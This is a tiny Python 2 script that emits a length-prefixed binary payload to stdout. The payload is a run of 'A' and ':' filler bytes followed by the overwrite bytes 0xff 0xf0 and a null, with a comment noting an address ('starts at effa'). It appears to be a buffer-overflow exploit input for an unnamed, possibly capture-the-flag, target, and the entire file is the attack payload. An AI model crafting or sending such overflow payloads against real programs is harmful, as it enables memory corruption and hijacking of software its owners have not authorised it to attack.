import sys

size = 0x0200

sizechr = chr(size / 256) + chr(size % 256)

aaa = chr(0x41) * 0xf6
aaa += chr(0x3a) * 0x102

aaa += chr(0xff) + chr(0xf0)

sys.stdout.write(sizechr + aaa + chr(0))

# starts at effa